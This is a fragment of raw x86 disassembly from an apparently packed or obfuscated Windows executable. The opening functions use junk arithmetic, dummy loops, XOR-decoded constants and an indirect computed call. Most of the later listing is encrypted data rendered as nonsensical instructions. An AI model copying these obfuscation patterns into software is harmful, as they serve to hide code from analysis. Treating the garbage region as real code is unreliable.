  4119ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a00:	je     0x411a2e
  411a02:	in     eax,dx
  411a03:	jnp    0x4119c9
  411a05:	pop    edi
  411a06:	(bad)  
  411a08:	int3   
  411a09:	hlt    
  411a0a:	jne    0x411a70
  411a0c:	mov    esp,0xaa11fbed
  411a11:	out    dx,al
  411a12:	push   edi
  411a13:	and    bl,BYTE PTR [ebx-0x9]
  411a16:	pop    esi
  411a17:	pop    edi
  411a18:	jb     0x411a20
  411a1a:	fmul   st(2),st
  411a1c:	mov    ebp,DWORD PTR [ebp-0x2c]
  411a1f:	sbb    al,0xb7
  411a21:	in     al,dx
  411a22:	dec    esi
  411a23:	cmp    eax,0xcf03ce33
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42a9db
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42a9df
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax+0x5324dda6]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx+0x6fd0b7a6],0xffffff90
  411d3c:	xor    ch,al
  411d3e:	mov    dh,0x34
  411d40:	cmp    DWORD PTR [edx],edi
  411d42:	jmp    DWORD PTR [edx]
  411d44:	mov    al,ch
  411d46:	retf   0x719c
  411d49:	in     al,dx
  411d4a:	inc    ebp
  411d4b:	and    ecx,DWORD PTR [eax+0x5f934c8a]
  411d51:	mov    ds:0xe8a7aca0,al
  411d56:	cmc    
  411d57:	mov    ah,0x2c
  411d59:	ret    
  411d5a:	lds    ebx,FWORD PTR [edx+0x1c]
  411d5d:	pop    eax
  411d5e:	mov    eax,0xd6dcae29
  411d63:	faddp  st(5),st
  411d65:	cmp    bh,al
  411d67:	jmp    0xcacee114
  411d6c:	sbb    DWORD PTR [ecx-0xfc51692],ebp
  411d72:	cmc    
  411d73:	popf   
  411d74:	sahf   
  411d75:	xchg   esp,eax
  411d76:	out    0x75,al
  411d78:	mov    al,0xe
  411d7a:	sub    BYTE PTR [ecx],ah
  411d7c:	add    bh,BYTE PTR [edi-0x6]
  411d7f:	into   
  411d80:	inc    ebp
  411d81:	mov    ds:0x866bfb1,al
  411d86:	out    0x15,eax
  411d88:	jmp    0xde54:0x406310b3
  411d8f:	ret    0x467a
  411d92:	adc    edi,ebp
  411d94:	es mov ah,0xf
  411d97:	scas   eax,DWORD PTR es:[edi]
  411d98:	push   esi
  411d99:	inc    ecx
  411d9a:	inc    edx
  411d9b:	pusha  
  411d9c:	push   ecx
  411d9d:	jp     0x411de4
  411d9f:	rcl    ebx,cl
  411da1:	push   eax
  411da2:	xchg   ecx,eax
  411da3:	push   ds
  411da4:	jge    0x411e14
  411da6:	sbb    DWORD PTR [ebx],ebx
  411da8:	out    0x56,al
  411daa:	mov    ds:0x272e199e,al
  411daf:	push   ebp
  411db0:	ret    
  411db1:	push   ecx
  411db2:	mov    dl,0x1d
  411db4:	xchg   edi,eax
  411db5:	ss out dx,al
  411db7:	cmc    
  411db8:	and    ebx,DWORD PTR [edi+0x39]
  411dbb:	mov    esp,0x27d4233d
  411dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dc2:	and    BYTE PTR [ecx+eax*1],dh
  411dc5:	(bad)  [ebx+0x4d]
  411dc8:	adc    BYTE PTR [esi],al
  411dca:	shl    BYTE PTR [ebp+ebx*2+0x63],0x6f
  411dcf:	aaa    
  411dd0:	adc    eax,0x23b799ac
  411dd5:	or     ch,BYTE PTR [ecx+0x5c]
  411dd8:	test   ah,0x4b
  411ddb:	pop    esp
  411ddc:	fistp  QWORD PTR [edi]
  411dde:	mov    es,WORD PTR [edx+edx*8-0x71b5e397]
  411de5:	sbb    al,0x20
  411de7:	fdivr  QWORD PTR ds:0xe6f750cd
  411ded:	(bad)  
  411def:	push   ds
  411df0:	enter  0x34d0,0xd8
  411df4:	inc    ebp
  411df5:	sub    esp,DWORD PTR [edx+0x32]
  411df8:	test   eax,0x1fa65c65
  411dfd:	mov    bl,0xa6
  411dff:	adc    BYTE PTR [ebx+esi*1-0x7168abef],0x29
  411e07:	dec    edi
  411e08:	adc    DWORD PTR [esi+0x431a8d8a],ebx
  411e0e:	mov    eax,0x3b5010cb
  411e13:	shr    DWORD PTR [esi],0xa6
  411e16:	popa   
  411e17:	mov    edi,ebx
  411e19:	popa   
  411e1a:	cs xor al,0x52
  411e1d:	mov    ss:0x3f1fb171,al
  411e23:	fs loopne 0x411dfc
  411e26:	push   cs
  411e27:	sbb    BYTE PTR [edx+0xbabb0ce],dl
  411e2d:	or     BYTE PTR [esp+eax*8],0x91
  411e31:	psrlw  mm6,QWORD PTR [edi-0x3c]
  411e35:	dec    BYTE PTR [ebp+eiz*1-0x51]
  411e39:	clc    
  411e3a:	inc    ebp
  411e3b:	and    esi,DWORD PTR ds:[edx-0x32653a16]
  411e42:	pop    es
  411e43:	test   bh,dh
  411e45:	xor    ch,BYTE PTR fs:[esi]
  411e48:	iret   
  411e49:	adc    ch,BYTE PTR [esi-0x6b]
  411e4c:	daa    
  411e4d:	sub    DWORD PTR [esi-0x17e480e8],esi
  411e53:	sbb    ah,BYTE PTR [edi-0x2cb83378]
  411e59:	pop    ebx
  411e5a:	fimul  DWORD PTR [edx+0x1]
  411e5d:	pusha  
  411e5e:	(bad)  
  411e60:	xchg   esp,eax
  411e61:	or     ch,dh
  411e63:	mov    esp,0xa435bc5
  411e68:	ror    BYTE PTR [ecx+0xd],0xd4
  411e6c:	arpl   sp,di
  411e6e:	or     BYTE PTR [ebx+eax*2+0x74d92fb0],ah
  411e75:	imul   ebx,DWORD PTR [ebp-0x3dfb936a],0xdaba7c8e
  411e7f:	xor    al,0x4b
  411e81:	sub    eax,0xffc9947d
  411e86:	test   eax,0x533b898
  411e8b:	inc    eax
  411e8c:	(bad)  
  411e8d:	dec    eax
  411e8e:	aas    
  411e8f:	inc    eax
  411e90:	(bad)  
  411e91:	call   0x888:0xaa60980b
  411e98:	cs inc ebp
  411e9a:	lock fwait
  411e9c:	jo     0x411ed0
  411e9e:	cmp    al,0xd0
  411ea0:	gs js  0x411f0f
  411ea3:	push   ebx
  411ea4:	cmp    BYTE PTR [eax+0x6003bb83],bh
  411eaa:	pop    edi
  411eab:	sub    bh,al
  411ead:	mov    eax,ds:0x8c7c9e81
  411eb2:	(bad)  
  411eb3:	bound  ebx,QWORD PTR [edx-0x12]
  411eb6:	xor    BYTE PTR [esi],dl
  411eb8:	push   ebp
  411eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ebb:	addr16 push 0xd74fbe7d
  411ec1:	xlat   BYTE PTR ds:[ebx]
  411ec2:	(bad)  
  411ec3:	mov    ds:0xa9e6b6ee,eax
  411ec8:	xrelease xchg DWORD PTR [esi+0x59240621],esi
  411ecf:	jae    0x411f40
  411ed1:	es inc ebx
  411ed3:	jl     0x411e9b
  411ed5:	sbb    al,0x71
  411ed7:	stc    
  411ed8:	mov    ds:0xfd3edd2f,eax
  411edd:	jl     0x411ef0
  411edf:	sahf   
  411ee0:	adc    eax,0xbfdd282
  411ee5:	jbe    0x411e9d
  411ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee8:	sub    edx,ebp
  411eea:	mov    cs,WORD PTR [edi+0x17]
  411eed:	jl     0x411ec7
  411eef:	xchg   esi,eax
  411ef0:	pop    esi
  411ef1:	ret    0xc56d
  411ef4:	and    BYTE PTR [ecx],ah
  411ef6:	dec    edx
  411ef7:	js     0x411ebd
  411ef9:	leave  
  411efa:	iret   
  411efb:	mov    eax,0x5da07016
  411f00:	scas   al,BYTE PTR es:[edi]
  411f01:	outs   dx,BYTE PTR ds:[esi]
  411f02:	pop    es
  411f03:	mov    bh,0xde
  411f05:	in     eax,0x99
  411f07:	mov    al,0xf2
  411f09:	jmp    0x63d15329
  411f0e:	adc    eax,0xe3963c6
  411f13:	sahf   
  411f14:	fcom   QWORD PTR [eax-0x2078ed75]
  411f1a:	xchg   edi,eax
  411f1b:	or     BYTE PTR ds:0xf390546,dl
  411f21:	(bad)  
  411f23:	retf   0x7cf6
  411f26:	popf   
  411f27:	popa   
  411f28:	and    DWORD PTR [ebp+0x2f9c6ac6],eax
  411f2e:	(bad)
  411f32:	mov    dl,ch
  411f34:	stos   DWORD PTR es:[edi],eax
  411f35:	not    BYTE PTR [ebp+0x38]
  411f38:	fidivr WORD PTR [ebp+eiz*2-0x71]
  411f3c:	jle    0x411edd
  411f3e:	xchg   edx,eax
  411f3f:	fwait
  411f40:	add    eax,0xfd2c827a
  411f45:	and    DWORD PTR [edi],edi
  411f47:	dec    edx
  411f48:	mov    bh,BYTE PTR [edx+0x626d84c9]
  411f4e:	jbe    0x411f37
  411f50:	cld    
  411f51:	addr16 inc esp
  411f53:	add    edx,ebp
  411f55:	ret    
  411f56:	jo     0x411f61
  411f58:	mov    ds:0xdd11ec72,eax
  411f5d:	sub    eax,0x90464944
  411f62:	outs   dx,BYTE PTR ds:[esi]
  411f63:	adc    bh,ch
  411f65:	addr16 xchg esp,eax
  411f67:	test   eax,0x928f2e5d
  411f6c:	xchg   edx,eax
  411f6d:	add    al,BYTE PTR [eax-0x24]
  411f70:	aaa    
  411f71:	xchg   esi,eax
  411f72:	add    ecx,edi
  411f74:	pop    ss
  411f75:	mov    edi,0x1f3c439
  411f7a:	pop    ebp
  411f7b:	adc    BYTE PTR [edi-0x7d],al
  411f7e:	sbb    al,ah
  411f80:	mov    eax,DWORD PTR [ebp-0x72d0ee90]
  411f86:	add    BYTE PTR [esi+0x490eacf3],0x9e
  411f8d:	(bad)  
  411f8f:	(bad)  
  411f90:	repnz in al,0x80
  411f93:	cmc    
  411f94:	mov    al,0xd8
  411f96:	sbb    BYTE PTR [esi+0x6839304e],bl
  411f9c:	mov    bh,0xe3
  411f9e:	out    dx,al
  411f9f:	sbb    eax,0xb6614ab
  411fa4:	ret    
  411fa5:	inc    edi
  411fa6:	mov    dl,0xba
  411fa8:	add    BYTE PTR [edi],0x71
  411fab:	jp     0x412014
  411fad:	mov    ds:0xdc22bde1,al
  411fb2:	dec    esp
  411fb3:	fstp   QWORD PTR ds:0x6712deea
  411fb9:	mov    dl,0x88
  411fbb:	mov    cl,0x82
  411fbd:	imul   BYTE PTR [ebp+ebx*1+0x4b]
  411fc1:	cdq    
  411fc2:	dec    ebx
  411fc3:	jns    0x411ff7
  411fc5:	sub    al,bl
  411fc7:	mov    esi,0x27932348
  411fcc:	mov    cl,0x9
  411fce:	and    ecx,DWORD PTR [edi-0x37378fd9]
  411fd4:	ja     0x41203d
  411fd6:	sub    DWORD PTR [ebx],edi
  411fd8:	pop    esi
  411fd9:	fdiv   QWORD PTR [edx+0x5f6c80aa]
  411fdf:	jge    0x41205c
  411fe1:	sub    BYTE PTR [ecx],al
  411fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fe4:	inc    ecx
  411fe5:	mov    eax,ds:0x5ee1e161
  411fea:	xor    esp,edi
  411fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fed:	pop    esp
  411fee:	rol    DWORD PTR [edi],0x7a
  411ff1:	dec    edi
  411ff2:	test   DWORD PTR [eax-0x63011c20],ecx
  411ff8:	sbb    ebp,DWORD PTR [ecx+ebx*2]
  411ffb:	pop    ss
  411ffc:	rol    BYTE PTR [ecx+0x2ae81861],0xd8
  412003:	xor    eax,0x1d796f1f
  412008:	not    DWORD PTR [ebx+0x7ae16a60]
  41200e:	pop    edx
  41200f:	mov    DWORD PTR [ecx],eax
  412011:	inc    esp
  412012:	clc    
  412013:	dec    eax
  412014:	jmp    0xe402b674
  412019:	mov    ebp,0x82de2f61
  41201e:	adc    al,0xd7
  412020:	out    0xa1,al
  412022:	jne    0x411fdd
  412024:	jl     0x4120a2
  412026:	or     al,0xb7
  412028:	adc    al,0x90
  41202a:	pushf  
  41202b:	enter  0xaf2f,0xec
  41202f:	jns    0x41200a
  412031:	push   ss
  412032:	mov    ah,0x57
  412034:	retf   0x2dcc
  412037:	pop    ds
  412038:	mov    edi,0x6c55235f
  41203d:	pop    eax
  41203e:	ja     0x41201c
  412040:	je     0x412036
  412042:	jne    0x41200c
  412044:	jmp    0x3bf500ca
  412049:	fstp   st(5)
  41204b:	mov    esp,0x86547214
  412050:	inc    esi
  412051:	jne    0x412053
  412053:	jecxz  0x412012
  412055:	dec    eax
  412056:	data16 loop 0x4120d7
  412059:	dec    edi
  41205a:	inc    ecx
  41205b:	inc    esp
  41205c:	and    dh,BYTE PTR [ebx+0xd]
  41205f:	jp     0x41209b
  412061:	add    BYTE PTR [edi+0x1b48f612],ah
  412067:	loopne 0x41200d
  412069:	imul   esp,DWORD PTR fs:0x9108848d,0xfffffffe
  412071:	lods   al,BYTE PTR ds:[si]
  412073:	clc    
  412074:	repz scas al,BYTE PTR es:[edi]
  412076:	mov    bh,0xd5
  412078:	(bad)  
  412079:	sbb    al,0x12
  41207b:	dec    esi
  41207c:	xchg   ebp,eax
  41207d:	push   ebx
  41207e:	dec    esi
  41207f:	loope  0x412030
  412081:	xchg   esi,eax
  412082:	lahf   
  412083:	sti    
  412084:	test   eax,0x6ca82dfd
  412089:	or     al,0x9d
  41208b:	jl     0x412023
  41208d:	or     DWORD PTR [edx-0x4c],edi
  412090:	pop    eax
  412091:	push   ebp
  412092:	pop    es
  412093:	or     al,0x10
  412095:	xchg   esi,eax
  412096:	in     al,dx
  412097:	add    esp,DWORD PTR [ebx]
  412099:	int3   
  41209a:	rcr    ebp,1
  41209c:	ss test al,0x59
  41209f:	sbb    BYTE PTR [eax+0xa],dl
  4120a2:	pop    ebp
  4120a3:	jne    0x4120fa
  4120a5:	popf   
  4120a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a7:	out    dx,eax
  4120a8:	and    eax,0x7a5acf00
  4120ad:	push   edx
  4120ae:	mov    eax,es:0xb51247e0
  4120b4:	les    esi,FWORD PTR [ebx+0x3d4b5d26]
  4120ba:	mov    cs,WORD PTR [edx-0x172f27c2]
  4120c0:	call   0x3610:0x49f55f08
  4120c7:	mov    al,ds:0xd63a5603
  4120cc:	stos   BYTE PTR es:[edi],al
  4120cd:	dec    ecx
  4120ce:	and    al,0x6d
  4120d0:	(bad)  
  4120d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120d2:	bnd ja 0x4120b9
  4120d5:	and    BYTE PTR [esi-0x5e8aa485],bh
  4120db:	and    al,0x11
  4120dd:	mov    eax,ds:0x8661efd2
  4120e2:	repz and al,0xfa
  4120e5:	inc    esp
  4120e6:	mov    edx,0x811b45a7
  4120eb:	pop    ebx
  4120ec:	jmp    0xa9837628
  4120f1:	daa    
  4120f2:	popa   
  4120f3:	sbb    eax,0x234f5703
  4120f8:	cmp    BYTE PTR [ebx+0x32ef23c9],bl
  4120fe:	fdiv   DWORD PTR [edi+ecx*1]
  412101:	dec    ebx
  412102:	loope  0x412150
  412104:	pop    ss
  412105:	push   edx
  412106:	rcl    BYTE PTR [ecx],1
  412108:	fimul  DWORD PTR [eax+0x31c97a6c]
  41210e:	push   edx
  41210f:	fisubr WORD PTR [esi]
  412111:	stos   BYTE PTR es:[edi],al
  412112:	inc    esi
  412113:	mov    ebx,DWORD PTR [ebp+0x71]
  412116:	xchg   edx,eax
  412117:	jnp    0x412178
  412119:	pop    ebp
  41211a:	cs aad 0x4
  41211d:	dec    edx
  41211e:	xlat   BYTE PTR ds:[ebx]
  41211f:	daa    
  412120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412121:	es jno 0x412165
  412124:	(bad)  
  412125:	rcr    dl,1
  412127:	std    
  412128:	fs push edi
  41212a:	bound  edi,QWORD PTR ds:0x5596be37
  412130:	add    al,0x58
  412132:	sub    al,0xe7
  412134:	push   esi
  412135:	bound  esp,QWORD PTR [esi]
  412137:	in     eax,dx
  412138:	add    edx,DWORD PTR [eax+eax*1]
  41213b:	push   eax
  41213c:	inc    eax
  41213d:	push   es
  41213e:	pop    eax
  41213f:	or     eax,0xda4672ec
  412144:	je     0x412131
  412146:	in     eax,dx
  412147:	out    0x13,eax
  412149:	gs pop ebx
  41214b:	push   0x9b706fa7
  412150:	mov    edx,0x1c09a1d7
  412155:	pushf  
  412156:	sbb    al,0x37
  412158:	into   
  412159:	stos   DWORD PTR es:[edi],eax
  41215a:	rcpps  xmm0,XMMWORD PTR [edi+0x409c7d41]
  412161:	sub    BYTE PTR [ecx+0x7487da4],dl
  412167:	repz xchg esp,eax
  412169:	fld    st(6)
  41216b:	(bad)  
  41216c:	mov    ds:0x96aa987e,eax
  412171:	stos   BYTE PTR es:[edi],al
  412172:	int3   
  412173:	repnz aad 0xf6
  412176:	nop
  412177:	xchg   BYTE PTR [ecx+edi*4+0x5f],dh
  41217b:	icebp  
  41217c:	mov    ecx,0x1613e9a5
  412181:	push   ds
  412182:	sbb    ebx,DWORD PTR [esi-0x65]
  412185:	mov    dh,0x2e
  412187:	mov    al,0x75
  412189:	loopne 0x412134
  41218b:	pop    ebx
  41218c:	aas    
  41218d:	std    
  41218e:	mov    eax,0x9537b679
  412193:	push   es
  412194:	test   BYTE PTR ds:0xb1ff68b5,0xd7
  41219b:	leave  
  41219c:	push   ss
  41219d:	loopne 0x4121b6
  41219f:	cmp    bh,BYTE PTR [ebx]
  4121a1:	lods   al,BYTE PTR ds:[esi]
  4121a2:	sbb    eax,0xeea4daaa
  4121a7:	pop    es
  4121a8:	mov    ch,0x2c
  4121aa:	sbb    al,0xa2
  4121ac:	xor    esi,DWORD PTR [ecx-0xd]
  4121af:	outs   dx,DWORD PTR ds:[esi]
  4121b0:	sbb    al,0xb
  4121b2:	pop    ecx
  4121b3:	pop    ss
  4121b4:	leave  
  4121b5:	inc    edx
  4121b6:	jnp    0x412176
  4121b8:	out    0xc9,eax
  4121ba:	stos   BYTE PTR es:[edi],al
  4121bb:	mov    edx,0xf6580c73
  4121c0:	pop    edx
  4121c1:	(bad)  
  4121c2:	mov    edi,0x87f238ac
  4121c7:	ins    BYTE PTR es:[edi],dx
  4121c8:	in     al,0xd5
  4121ca:	jnp    0x41223a
  4121cc:	jle    0x41219e
  4121ce:	(bad)  
  4121d0:	inc    esi
  4121d1:	mov    ebp,0x8b856bb9
  4121d6:	std    
  4121d7:	icebp  
  4121d8:	add    al,dh
  4121da:	mov    ebp,0xca517611
  4121df:	in     eax,0x79
  4121e1:	adc    dh,cl
  4121e3:	daa    
  4121e4:	and    esp,DWORD PTR [eax+0x46f5600d]
  4121ea:	jmp    0x9657:0x136bddd3
  4121f1:	dec    ecx
  4121f2:	lds    eax,FWORD PTR [esi]
  4121f4:	(bad)  
  4121f6:	dec    eax
  4121f7:	inc    ebp
  4121f8:	mov    edx,0xd90f8b3
  4121fd:	sub    al,0x21
  4121ff:	inc    ebp
  412200:	ss adc al,0x82
  412203:	sbb    ebp,DWORD PTR [ecx]
  412205:	out    0xba,al
  412207:	(bad)  
  412208:	and    eax,0x11be3c5f
  41220d:	int3   
  41220e:	addr16 and ecx,esi
  412211:	daa    
  412212:	jmp    0x5c9831fa
  412217:	xchg   DWORD PTR [edx+0x70],edi
  41221a:	dec    ebx
  41221b:	fist   WORD PTR [eax+0x2357bf94]
  412221:	test   BYTE PTR [esp+ecx*2],0x10
  412225:	shl    BYTE PTR [esi-0x7dcfed96],cl
  41222b:	sbb    al,0x93
  41222d:	mov    esp,0x441330c7
  412232:	inc    ecx
  412233:	in     eax,0xdb
  412235:	xchg   BYTE PTR [eax+0x9],ch
  412238:	gs cs js 0x4121eb
  41223c:	xchg   dh,bl
  41223e:	repz dec esi
  412240:	mov    edi,0xce77b82e
  412245:	mov    ebp,0xbf29a600
  41224a:	loopne 0x4121fb
  41224c:	aad    0xaa
  41224e:	or     al,0x7c
  412250:	fwait
  412251:	adc    eax,DWORD PTR [eax-0x441af00c]
  412257:	ror    edi,1
  412259:	adc    esi,ecx
  41225b:	jl     0x41221d
  41225d:	push   0x31
  41225f:	inc    ecx
  412260:	sub    eax,0x5d8eb8bf
  412265:	ficom  DWORD PTR [ebx+0x1d]
  412268:	sub    BYTE PTR [edi-0x52],dl
  41226b:	adc    eax,0xeeb0cd22
  412270:	cmp    BYTE PTR ds:0x5681446a,dl
  412276:	dec    ebp
  412277:	xchg   ebp,eax
  412278:	pop    ebx
  412279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41227a:	or     DWORD PTR [ebx+edi*2-0x50],esi
  41227e:	mov    dl,0xb7
  412280:	pop    ebx
  412281:	sbb    DWORD PTR [edx+0x4],edx
  412284:	jp     0x41229c
  412286:	mov    dl,0x3e
  412288:	(bad)  
  41228a:	jp     0x4122a5
  41228c:	mov    ?,WORD PTR [eax-0x6c65a166]
